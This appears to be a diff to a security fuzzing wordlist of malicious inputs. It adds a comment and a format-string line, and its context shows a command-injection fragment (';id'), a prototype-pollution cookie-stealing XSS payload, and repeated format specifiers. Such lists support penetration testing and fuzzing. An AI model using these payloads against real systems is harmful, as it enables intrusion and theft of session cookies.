@@ -1,4 +1,3 @@
-
  ;
  '
  "
@@ -386,6 +385,7 @@ __schema
 &quot;;id&quot;
 &x=y#
 #
+# a wide sample of malicious input for windows targets
 # known cross platform source Code, file disclosure attack patterns - append after file or dir path
 #__proto__[hitCallback]=alert%28document.cookie%29
 #'
@@ -462,6 +462,7 @@ __schema
 %99999999999s
 %a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a
 %A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A
+%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d
 %d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d 
 %e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e
 %E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E
